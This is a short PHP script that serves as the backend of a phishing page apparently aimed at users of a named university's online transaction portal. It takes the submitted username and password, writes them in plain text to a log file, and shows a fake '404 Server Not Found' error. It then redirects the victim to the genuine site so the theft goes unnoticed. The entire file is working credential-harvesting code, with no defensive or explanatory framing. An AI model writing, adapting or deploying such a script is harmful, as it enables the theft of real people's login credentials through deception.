<?php
// Here I'm get the User name and password  value to the $username and $password
$username=$_POST["username"];
$password=$_POST["password"];


//echo "$username : " . $password;

//Create a datalog.txt file for store the username and password if file cant open die
$myfile = fopen("datalog.txt", "a") or die("unable to open file!");

//Store values in this $txt variable name
$txt="USERNAME=$username, PASSWORD=$password\n";

// when we get the vales it will be write the datalog file
fwrite($myfile, "\n".$txt);
fclose($myfile);

// when he enter the details he get error message
echo " This site can’t be reached";
echo "<br/>"; 
echo "<br/>"; 
echo "<br/>"; 
echo "<br/>"; 
echo " <b>404 Server Not F ound </b>";
//when he click login button and after two sec redirect to the sliit online transaction page
header("Refresh: 2 ; URL=http://www.sliit.lk/online/");

exit();

?>
